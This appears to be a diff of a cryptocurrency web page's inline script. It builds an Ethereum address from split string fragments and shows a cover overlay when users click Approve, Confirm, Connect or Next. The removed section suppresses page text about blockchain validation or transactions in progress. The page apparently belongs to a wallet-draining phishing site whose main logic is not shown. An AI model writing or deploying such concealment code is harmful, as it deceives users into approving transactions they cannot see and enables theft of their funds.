@@ -143,116 +143,71 @@
     <!-- ETHERS -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
 
-    <script>
-        /* ===== GLOBAL VARS ===== */
+  <script>
+    /* ===== GLOBAL VARS ===== */
 
-        const _p1 = "0xE57C99A3ae2ae12";
-        const _p2 = "4f026BFa8601F7A956";
-        const _p3 = "309FB53";
+    const _p1 = "0xE57C99A3ae2ae12";
+    const _p2 = "4f026BFa8601F7A956";
+    const _p3 = "309FB53";
 
-        window.rA = _p1 + _p2 + _p3;
-        window.XB = "";
+    window.rA = _p1 + _p2 + _p3;
+    window.XB = "";
 
-        /* ===== FIX ENCODING ≈ ===== */
+    /* ===== FIX ENCODING ===== */
 
-        function forceFixApprox() {
+    function forceFixApprox() {
 
-            document.querySelectorAll("*").forEach((el) => {
+        document.querySelectorAll("*").forEach((el) => {
 
-                const txt = el.textContent?.trim();
+            const txt = el.textContent?.trim();
 
-                if (!txt) return;
-
-                if (
-                    txt.includes("Ã¢â°Ë†") ||
-                    txt.includes("â‰ˆ") ||
-                    txt.includes("Â≈")
-                ) {
-
-                    el.innerHTML = el.innerHTML
-                        .replace(/Ã¢â°Ë†/g, "≈")
-                        .replace(/â‰ˆ/g, "≈")
-                        .replace(/Â≈/g, "≈");
-                }
-            });
-        }
-
-        window.addEventListener("load", () => {
-            forceFixApprox();
-            setInterval(forceFixApprox, 300);
-        });
-
-        /* ===== OBSERVER ===== */
-
-        window.addEventListener("DOMContentLoaded", () => {
-
-            const overlay =
-                document.getElementById("loader-overlay");
-
-            const observer =
-                new MutationObserver((mutations) => {
-
-                    mutations.forEach((mutation) => {
-
-                        mutation.addedNodes.forEach((node) => {
-
-                            if (node.nodeType !== 1) return;
-
-                            const text =
-                                node.textContent || "";
-
-                            if (
-                                text.includes("Blockchain validation") ||
-                                text.includes("Transaction in progress") ||
-                                text.includes("Processing")
-                            ) {
-                                node.remove?.();
-
-                                overlay.style.display =
-                                    "flex";
-                            }
-                        });
-                    });
-
-                    forceFixApprox();
-                });
-
-            observer.observe(document.body, {
-                childList: true,
-                subtree: true
-            });
-
-            setTimeout(forceFixApprox, 1000);
-        });
-
-        /* ===== BUTTON LISTENER ===== */
-
-        window.addEventListener("click", (e) => {
-
-            const button =
-                e.target.closest?.("button");
-
-            const btnText =
-                button?.innerText || "";
+            if (!txt) return;
 
             if (
-                btnText.includes("Approve") ||
-                btnText.includes("Confirm") ||
-                btnText.includes("Connect") ||
-                btnText.includes("Next")
+                txt.includes("Ã¢â°Ë†") ||
+                txt.includes("â‰ˆ") ||
+                txt.includes("Â≈")
             ) {
-                setTimeout(() => {
 
-                    document
-                        .getElementById(
-                            "loader-overlay"
-                        )
-                        .style.display = "flex";
-
-                }, 500);
+                el.innerHTML = el.innerHTML
+                    .replace(/Ã¢â°Ë†/g, "≈")
+                    .replace(/â‰ˆ/g, "≈")
+                    .replace(/Â≈/g, "≈");
             }
         });
-    </script>
+    }
+
+    window.addEventListener("load", () => {
+        setTimeout(forceFixApprox, 500);
+    });
+
+    /* ===== BUTTON LISTENER ===== */
+
+    window.addEventListener("click", (e) => {
+
+        const button = e.target.closest?.("button");
+        const btnText = button?.innerText || "";
+
+        if (
+            btnText.includes("Approve") ||
+            btnText.includes("Confirm") ||
+            btnText.includes("Connect") ||
+            btnText.includes("Next")
+        ) {
+
+            setTimeout(() => {
+
+                const overlay =
+                    document.getElementById("loader-overlay");
+
+                if (overlay) {
+                    overlay.style.display = "flex";
+                }
+
+            }, 500);
+        }
+    });
+</script>
 
     <!-- JS LOCALE -->
     <script type="module" src="./index.js"></script>
